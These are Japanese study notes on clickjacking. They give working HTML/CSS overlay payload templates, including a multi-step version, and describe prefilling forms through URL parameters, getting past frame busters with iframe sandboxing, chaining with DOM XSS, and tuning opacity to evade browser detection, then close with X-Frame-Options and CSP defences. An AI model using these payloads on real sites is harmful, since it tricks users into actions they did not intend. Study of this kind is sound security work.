###### Clickjackingの可能性があるとき

- ユーザの操作で攻撃者の狙い通りの操作をさせたいとき
- `X-Frame-Options`や`Content-Security-Policy`の設定がないとき

#### Clickjackingの基本

- iframeやCSSの技術を使う
- 正規のWebサイトを透明にして==手前に==配置し、背後に攻撃者の用意したページを(透明にせず)配置する

###### CSRFとの違い

- CSRFはユーザの知識や入力なしにリクエストすべてを偽造する
- Clickjackingはユーザがボタンのクリックのようなアクションを実行する必要がある
- CSRF tokenはクリックジャッキングに対して意味がない

![[Pasted image 20240107182249.png | 300]]

---
## 基本的なclickjackingの構築

#### Clickbandit

- Burpのクリックジャッキング用ペイロード自動作成ツール
- うまくいかない時がある。テストツールとしては微妙なので基本使わない

###### 使い方

- Top menuのBurp -> Burp Clickbandit -> Copy Clickbandit to clipboard -> 脆弱そうなページを開く -> 開発者ツールのConsoleにpasteしてEnter

- Startをクリック -> 被害者の操作を真似する。これはClickbanditに記録される.
	- "Disable click actions" :クリックによるアクションは実行されない
	- Sandbox iframe? : `allow-scripts` `allow-forms`のどちらかを使用する

- Review modeへ
	- `+`や`-`でズームアウトやイン
	- saveボタンでペイロードのHTMLファイルを保存する。保存したファイルを開いて開発者ツール-> Elements -> `<html>`選択 -> Copy　でHTMLをコピーできる

### 汎用版

1. `iframe`の`src`属性にターゲットのWebサイトのURLを入力
2. 被害者にクリックさせたい箇所と"Click Me"を一致させるために、`px`を調整する(値は目安)
```html
<style>
	#target_website {
		position:relative;
		width:1700px;
		height:900px;
		opacity:0.1;
		z-index:2;
		}
	#decoy_website {
		position:absolute;
		top:480px;
		left:340px;
		z-index:1;
		}
</style>
<div id="decoy_website">Click me</div>
<iframe id="target_website" src="[URL]"></iframe>
```

2. opacityを調整する(目安0.0001)

##### 注意
- ブラウザによっては透明度(`opacity`)の値でクリックジャッキングを検出し、アラートを表示するなどがある
- ブラウザの種類やバージョンによって異なるので、攻撃が防がれない透明度を割り出す必要がある
 ---
### 入力済みフォームのクリックジャッキング

###### 具体例(基本概念)

- フォームによってはGETリクエストのURLクエリでフォームの中身を入力できるものがある
![[Pasted image 20240107212007.png | 300]]
- このようなとき、以下のようにURLクエリを変更すると中身が入力される
```
https://target/my-account?email=hoge@hoge
```
![[Pasted image 20240107212113.png | 200]]

###### 悪用ステップ

1. クリックジャッキングの脆弱性があるか？
2. GETリクエストのURLクエリ文字列でフォームの中身を事前に入力できるか？
- 例
```
http://TARGET_NET/?[formタグ内inputのname属性の値]=hogehoge
```

3. `iframe`の`src`属性のURLでパラメタと値を指定して、あとは通常通りペイロードを生成しDeliver

---
### frame busterの回避

###### frame busterとは

- クリックジャッキング防止のJS
- すべてのフレームを見える化したりアラートを発したり

###### 悪用ステップ

1. [Clickjacking](#基本的なclickjackingの構築)の`iframe`に`sandbox`属性を付与し、`allow-forms`か`allow-scripts`を設定する
```html
<iframe id="target_website" src="[URL]" sandbox="allow-forms">
```

- 通常の開発では、これに合わせて`allow-top-navigation`を値を付与することでどれがトップウィンドウであるか示す。
- あえて値を省略することでframe busterを回避する

---
## クリックジャッキング ✖︎ DOM XSS

###### 関連

- [5. DOM based XSS](XSS/5.%20DOM%20based%20XSS.md)

###### 方法

1. DOM based XSS脆弱性探索
2. XSS攻撃のリンクを`iframe`の`src`属性に指定する
	- 必要であれば[Clickjacking](#入力済みフォームのクリックジャッキング)

3. ペイロードを作成・ホストし、被害者にDeliver

---
## マルチステップなクリックジャッキング

- [Clickjacking](#汎用版)を2つコピーして、要素のid名(もしくはクラス名)をそれぞれ変えて位置を調整するだけ
- ↓シンプルなスクリプト例
```html
<style>
	iframe {
		position:relative;
		width:1700px;
		height: 900px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src=""></iframe>
```

---
## クリックジャッキング対策

- X-Frame-OptionsとCSPで多層防御する(ブラウザによってはサポートしてないこともあるので)
- [8. (範囲外)CSPによる攻撃の軽減とCSPのバイパス](XSS/8.%20(範囲外)CSPによる攻撃の軽減とCSPのバイパス.md#[X-Frame-Options](https%20//developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Frame-Options)との違い)

### X-Frame-Options

- `<head>`内で以下定義

- 一切拒否
```
X-Frame-Options: deny
```
- 同じオリジンのみ
```
X-Frame-Options: sameorigin
```
- 指定したオリジンのみ
```
X-Frame-Options: allow-from https://normal-website.com
```

### CSP

- クリックジャッキングだけでなくXSSにも有効
- [8. (範囲外)CSPによる攻撃の軽減とCSPのバイパス](XSS/8.%20(範囲外)CSPによる攻撃の軽減とCSPのバイパス.md#CSPによるクリックジャッキング対策)